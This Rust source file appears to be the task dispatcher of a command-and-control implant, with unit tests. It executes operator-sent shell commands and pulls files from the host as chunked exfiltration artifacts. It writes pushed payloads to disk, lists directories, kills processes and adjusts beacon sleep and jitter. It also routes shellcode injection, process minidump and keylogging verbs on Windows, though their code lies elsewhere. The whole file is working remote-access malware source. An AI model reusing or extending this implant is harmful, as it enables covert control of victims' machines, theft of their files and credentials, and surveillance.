use std::sync::{Arc, Mutex};

use base64::Engine;

use crate::plugins::Plugins;
use crate::profile::parse_duration;

// The verb registry: string-in, string-out handlers over the shared task
// grammar, with the argument shapes the operator console and the capability
// documentation carry, so muscle memory and the UI work the same on every
// implant.

/// The live cadence a beacon.sleep retune mutates (sleep seconds, jitter
/// half-width seconds).
pub type Cadence = Arc<Mutex<(f64, f64)>>;

/// Every verb this binary compiled, in advertised order. The handshake
/// advertises the baked class verbs intersected with this set. The sets are
/// cfg'd whole: attributes do not apply to array elements. The channel verbs
/// (shell.interact, tunnel.forward, tunnel.socks) are compiled on every
/// platform -- their machinery lives in the channel layer, not the handler
/// table, and dispatch routes them there. The module family is compiled on
/// every platform too (architecture.md Sec 5.4): module.unload and
/// module.list always answer, and module.load answers through the staged
/// arm -- on a platform with no in-process loader it fails cleanly naming
/// the boundary, which is the honest advertisement.
#[cfg(windows)]
pub const COMPILED_VERBS: &[&str] = &[
    "shell.exec",
    "shell.interact",
    "file.pull",
    "file.push",
    "fs.list",
    "beacon.sleep",
    "proc.kill",
    "tunnel.forward",
    "tunnel.socks",
    "module.load",
    "module.unload",
    "module.list",
    "inject.shellcode",
    "collect.minidump",
    "collect.keylog",
];

#[cfg(not(windows))]
pub const COMPILED_VERBS: &[&str] = &[
    "shell.exec",
    "shell.interact",
    "file.pull",
    "file.push",
    "fs.list",
    "beacon.sleep",
    "proc.kill",
    "tunnel.forward",
    "tunnel.socks",
    "module.load",
    "module.unload",
    "module.list",
];

/// One chunk per 512 KiB: comfortably under the frame-layer sizing budget
/// the proto documents ("a single frame stays well under 1 MiB").
const CHUNK_BYTES: usize = 512 * 1024;

/// The single-frame inline cap for file.pull: bytes at or under it return in
/// the TaskResult, larger streams ride exfil chunks.
const MAX_INLINE_BYTES: usize = 1 << 20;

/// The inline file.push cap: base64 that decodes past it is refused with the
/// ceiling named (staged uploads carry anything larger).
const MAX_PUSH_BYTES: usize = 8 << 20;

pub struct HandlerOutput {
    pub outcome: Outcome,
    pub output: String,
    /// The artifact run this task produced, if any: the whole bytes, named
    /// and typed, handed to the session's upload state (ADR-010's upload
    /// arm). The carriages slice a run per contact under the body budget
    /// and resume it from the server's seam reports -- nothing about the
    /// run rides the outbox's verbatim batch discipline.
    pub artifact: Option<ArtifactRun>,
}

/// One exfil upload run's declaration: the logical name, the MIME hint, and
/// the bytes themselves.
pub struct ArtifactRun {
    pub name: String,
    pub content_type: String,
    pub data: Vec<u8>,
}

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Outcome {
    Succeeded,
    Failed,
}

impl HandlerOutput {
    fn ok(output: String) -> HandlerOutput {
        HandlerOutput {
            outcome: Outcome::Succeeded,
            output,
            artifact: None,
        }
    }
    fn ok_with_artifact(output: String, artifact: ArtifactRun) -> HandlerOutput {
        HandlerOutput {
            outcome: Outcome::Succeeded,
            output,
            artifact: Some(artifact),
        }
    }
    fn fail(output: String) -> HandlerOutput {
        HandlerOutput {
            outcome: Outcome::Failed,
            output,
            artifact: None,
        }
    }
}

/// Dispatches one verb; an unknown verb fails with the grammar named rather
/// than panicking -- the advertised set should have prevented it, and a
/// failure the operator can read beats a dropped task. The compiled table
/// answers first, the plugin table second (architecture.md Sec 5.4): a
/// module verb reads exactly like a compiled one.
pub fn dispatch(
    verb: &str,
    arguments: &str,
    cadence: &Cadence,
    plugins: &Plugins,
) -> HandlerOutput {
    match verb {
        "shell.exec" => shell_exec(arguments),
        "file.pull" => file_pull(arguments),
        "file.push" => file_push(arguments),
        "fs.list" => fs_list(arguments),
        "beacon.sleep" => beacon_sleep(arguments, cadence),
        // The module family's one-shot verbs; module.load itself answers
        // through the staged arm (the bytes ride the task's content).
        "module.load" => HandlerOutput::fail(
            "module.load stages its bytes as task content; issue it with the module as content"
                .into(),
        ),
        "module.unload" => module_unload(arguments, plugins),
        "module.list" => HandlerOutput::ok(plugins.list()),
        #[cfg(windows)]
        "proc.kill" => crate::sensitive::proc_kill(arguments),
        // The documented Unix administration path: TERM first, KILL if the
        // process outlives the grace window.
        #[cfg(not(windows))]
        "proc.kill" => unix_proc_kill(arguments),
        #[cfg(windows)]
        "inject.shellcode" => crate::sensitive::inject_shellcode(arguments),
        #[cfg(windows)]
        "collect.minidump" => crate::sensitive::collect_minidump(arguments),
        #[cfg(windows)]
        "collect.keylog" => crate::sensitive::collect_keylog(arguments),
        _ => match plugins.dispatch(verb, arguments) {
            Some((outcome, output)) => HandlerOutput {
                outcome,
                output,
                artifact: None,
            },
            None => HandlerOutput::fail(format!(
                "{verb}: this build carries no handler for the verb"
            )),
        },
    }
}

fn module_unload(arguments: &str, plugins: &Plugins) -> HandlerOutput {
    let name = arguments.trim();
    if name.is_empty() {
        return HandlerOutput::fail("module.unload expects '<name>'".into());
    }
    match plugins.unload(name) {
        Ok(report) => HandlerOutput::ok(report),
        Err(cause) => HandlerOutput::fail(cause),
    }
}

fn shell_exec(arguments: &str) -> HandlerOutput {
    let command = arguments.trim();
    if command.is_empty() {
        return HandlerOutput::fail("shell.exec expects '<command>'".into());
    }
    let program = if cfg!(windows) { "cmd" } else { "sh" };
    let flag = if cfg!(windows) { "/C" } else { "-c" };
    match std::process::Command::new(program)
        .arg(flag)
        .arg(command)
        .output()
    {
        Ok(output) => {
            let mut text = String::from_utf8_lossy(&output.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
            if !stderr.is_empty() {
                if !text.is_empty() && !text.ends_with('\n') {
                    text.push('\n');
                }
                text.push_str(&stderr);
            }
            if output.status.success() {
                HandlerOutput::ok(text)
            } else {
                let code = output.status.code().unwrap_or(-1);
                HandlerOutput::fail(format!("exit {code}: {text}"))
            }
        }
        Err(err) => HandlerOutput::fail(format!("spawn: {err}")),
    }
}

fn file_pull(arguments: &str) -> HandlerOutput {
    let path = arguments.trim();
    if path.is_empty() {
        return HandlerOutput::fail("file.pull expects '<path>'".into());
    }
    let metadata = match std::fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(_) => return HandlerOutput::fail(format!("stat {path}: file not found")),
    };
    if metadata.is_dir() {
        return HandlerOutput::fail(format!("file.pull refuses to dump a directory: {path}"));
    }
    let data = match std::fs::read(path) {
        Ok(data) => data,
        Err(err) => return HandlerOutput::fail(format!("read {path}: {err}")),
    };
    if data.len() <= MAX_INLINE_BYTES {
        // The inline shape reports the bytes verbatim, UTF-8 lossy -- the
        // operator console renders text; binary goes the chunked path.
        return HandlerOutput::ok(String::from_utf8_lossy(&data).into_owned());
    }
    let name = std::path::Path::new(path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "artifact".into());
    let chunks = data.len().div_ceil(CHUNK_BYTES);
    HandlerOutput::ok_with_artifact(
        format!(
            "{path}: {} bytes, {chunks} chunks streamed to artifact store",
            data.len()
        ),
        ArtifactRun {
            name,
            content_type: "application/octet-stream".into(),
            data,
        },
    )
}

fn file_push(arguments: &str) -> HandlerOutput {
    // The base64 payload is the tail after the last space (base64 contains
    // no spaces); the path is everything before it, spaces included.
    let Some(space) = arguments.rfind(' ') else {
        return HandlerOutput::fail("file.push expects '<path> <base64>'".into());
    };
    let path = arguments[..space].trim();
    let payload = arguments[space + 1..].trim();
    if path.is_empty() || payload.is_empty() {
        return HandlerOutput::fail("file.push expects '<path> <base64>'".into());
    }
    let data = match base64::engine::general_purpose::STANDARD.decode(payload) {
        Ok(data) => data,
        Err(_) => return HandlerOutput::fail("file.push: payload is not valid base64".into()),
    };
    if data.len() > MAX_PUSH_BYTES {
        return HandlerOutput::fail(format!(
            "file.push: payload of {} bytes exceeds the {MAX_PUSH_BYTES}-byte single-task cap",
            data.len()
        ));
    }
    if let Some(parent) = std::path::Path::new(path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let length = data.len();
    match std::fs::write(path, data) {
        Ok(()) => HandlerOutput::ok(format!("{path}: {length} bytes written")),
        Err(err) => HandlerOutput::fail(format!("write {path}: {err}")),
    }
}

fn fs_list(arguments: &str) -> HandlerOutput {
    let path = if arguments.trim().is_empty() {
        "."
    } else {
        arguments.trim()
    };
    let entries = match std::fs::read_dir(path) {
        Ok(entries) => entries,
        Err(err) => return HandlerOutput::fail(format!("list {path}: {err}")),
    };
    let mut lines = Vec::new();
    for entry in entries.flatten() {
        let metadata = entry.metadata().ok();
        let name = entry.file_name().to_string_lossy().into_owned();
        let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
        // One JSON object per line, the line shape the operator console's
        // listing parser reads.
        lines.push(format!(
            "{{\"name\":\"{}\",\"dir\":{},\"size\":{}}}",
            name.replace('\\', "\\\\").replace('"', "\\\""),
            is_dir,
            size
        ));
    }
    lines.sort();
    HandlerOutput::ok(lines.join("\n"))
}

fn beacon_sleep(arguments: &str, cadence: &Cadence) -> HandlerOutput {
    let tokens: Vec<&str> = arguments.split_whitespace().collect();
    if tokens.is_empty() || tokens.len() > 2 {
        return HandlerOutput::fail(
            "beacon.sleep: expected \"<sleep> [jitter]\", e.g. \"10s\", \"30 5\", \"0 0\"".into(),
        );
    }
    let sleep = parse_duration(tokens[0]);
    let mut guard = cadence.lock().expect("cadence");
    let jitter = if tokens.len() == 2 {
        parse_duration(tokens[1])
    } else {
        guard.1
    };
    let prior = *guard;
    *guard = (sleep, jitter);
    drop(guard);
    HandlerOutput::ok(format!(
        "contact every {sleep}s ± {jitter}s (was {}s ± {}s); applies from the next cycle",
        prior.0, prior.1
    ))
}

/// proc.kill on Unix: kill(2) with TERM, escalating to KILL once the grace
/// window passes -- the documented administration sequence.
#[cfg(not(windows))]
fn unix_proc_kill(arguments: &str) -> HandlerOutput {
    let Ok(pid) = arguments.trim().parse::<i32>() else {
        return HandlerOutput::fail("proc.kill expects '<pid>'".into());
    };
    if pid <= 1 {
        return HandlerOutput::fail("proc.kill refuses to signal pid <= 1".into());
    }
    unsafe {
        if libc::kill(pid, libc::SIGTERM) != 0 {
            return HandlerOutput::fail(format!("proc.kill: kill({pid}, TERM): errno {}", errno()));
        }
        for _ in 0..50 {
            if libc::kill(pid, 0) != 0 {
                return HandlerOutput::ok(format!("pid {pid} terminated (TERM)"));
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        if libc::kill(pid, libc::SIGKILL) != 0 {
            return HandlerOutput::fail(format!("proc.kill: kill({pid}, KILL): errno {}", errno()));
        }
    }
    HandlerOutput::ok(format!(
        "pid {pid} killed (escalated past the grace window)"
    ))
}

#[cfg(not(windows))]
fn errno() -> i32 {
    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cadence() -> Cadence {
        Arc::new(Mutex::new((30.0, 5.0)))
    }

    fn dispatch(verb: &str, arguments: &str) -> HandlerOutput {
        super::dispatch(verb, arguments, &cadence(), &Plugins::new())
    }

    /// A per-test scratch directory under the system temp dir, removed on
    /// entry so reruns start clean.
    fn scratch(name: &str) -> std::path::PathBuf {
        let dir =
            std::env::temp_dir().join(format!("rod-implant-tests-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("scratch dir");
        dir
    }

    #[test]
    fn unknown_verbs_fail_with_the_grammar_named() {
        let out = dispatch("no.such.verb", "args");
        assert_eq!(out.outcome, Outcome::Failed);
        assert!(out.output.contains("no.such.verb"), "{}", out.output);
        assert!(out.artifact.is_none());
    }

    #[test]
    fn beacon_sleep_retunes_the_live_cadence() {
        let cadence = cadence();
        let plugins = Plugins::new();
        let out = super::dispatch("beacon.sleep", "10s 1", &cadence, &plugins);
        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
        assert_eq!(*cadence.lock().unwrap(), (10.0, 1.0));
        // A missing jitter keeps the live one.
        super::dispatch("beacon.sleep", "20", &cadence, &plugins);
        assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
        // Malformed tasking changes nothing.
        let bad = super::dispatch("beacon.sleep", "1 2 3", &cadence, &plugins);
        assert_eq!(bad.outcome, Outcome::Failed);
        assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
    }

    #[test]
    fn file_push_and_pull_round_trip() {
        let dir = scratch("transfer");
        let path = dir.join("note.txt");
        let payload = base64::engine::general_purpose::STANDARD.encode(b"rod unit");
        let push = dispatch("file.push", &format!("{} {}", path.display(), payload));
        assert_eq!(push.outcome, Outcome::Succeeded, "{}", push.output);
        let pull = dispatch("file.pull", path.to_str().unwrap());
        assert_eq!(pull.outcome, Outcome::Succeeded, "{}", pull.output);
        assert_eq!(pull.output, "rod unit");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn oversized_pulls_hand_the_whole_run_to_the_session() {
        let dir = scratch("chunked");
        let path = dir.join("blob.bin");
        // One byte past the inline cap: the run carries the whole artifact
        // (the session slices it per contact under the body budget,
        // ADR-010's upload arm) -- two full 512 KiB slices plus a one-byte
        // tail, counted on the output the operator reads.
        std::fs::write(&path, vec![0u8; MAX_INLINE_BYTES + 1]).expect("blob");
        let out = dispatch("file.pull", path.to_str().unwrap());
        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
        let run = out.artifact.expect("the oversized pull declares a run");
        assert_eq!(run.data.len(), MAX_INLINE_BYTES + 1);
        assert!(out.output.contains("3 chunks"), "{}", out.output);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn file_push_refuses_malformed_tasking() {
        for arguments in ["", "   ", "no-space-no-payload"] {
            let out = dispatch("file.push", arguments);
            assert_eq!(out.outcome, Outcome::Failed, "{arguments}");
        }
        let out = dispatch("file.push", "certainly/not/a/path !!!not-base64!!!");
        assert_eq!(out.outcome, Outcome::Failed);
    }

    #[test]
    fn listings_report_sorted_json_lines() {
        let dir = scratch("list");
        std::fs::write(dir.join("b.txt"), b"1").expect("file");
        std::fs::create_dir(dir.join("a")).expect("dir");
        let out = dispatch("fs.list", dir.to_str().unwrap());
        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
        let names: Vec<String> = out
            .output
            .lines()
            .map(|line| {
                let entry: serde_json::Value = serde_json::from_str(line).expect("json lines");
                entry["name"].as_str().expect("a name").to_string()
            })
            .collect();
        assert_eq!(names, vec!["a".to_string(), "b.txt".to_string()]);
    }

    #[test]
    fn shell_exec_captures_output_and_exit_codes() {
        let banner = if cfg!(windows) {
            "echo rod-unit"
        } else {
            "printf rod-unit"
        };
        let out = dispatch("shell.exec", banner);
        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
        assert_eq!(out.output.trim(), "rod-unit");
        let failed = dispatch("shell.exec", "exit 3");
        assert_eq!(failed.outcome, Outcome::Failed);
        assert!(failed.output.contains('3'), "{}", failed.output);
        let empty = dispatch("shell.exec", "   ");
        assert_eq!(empty.outcome, Outcome::Failed);
    }
}
